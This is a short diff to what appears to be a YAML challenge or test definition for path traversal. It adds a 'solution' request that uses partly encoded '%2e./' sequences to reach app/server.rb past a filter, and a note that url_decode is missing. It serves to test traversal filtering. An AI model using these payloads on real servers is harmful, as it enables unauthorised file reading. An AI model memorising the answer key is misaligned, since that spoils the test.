@@ -17,6 +17,12 @@ base_request: |-
   GET /../../../../../../../app/server.rb HTTP/1.1
   Host: localhost
 
+solution: |-
+  GET /%2e./%2e./%2e./%2e./%2e./%2e./%2e./app/server.rb HTTP/1.1
+  Host: localhost
+
+solution_note: Missing `url_decode`
+
 rules:
 # Raw, encoding
 - >
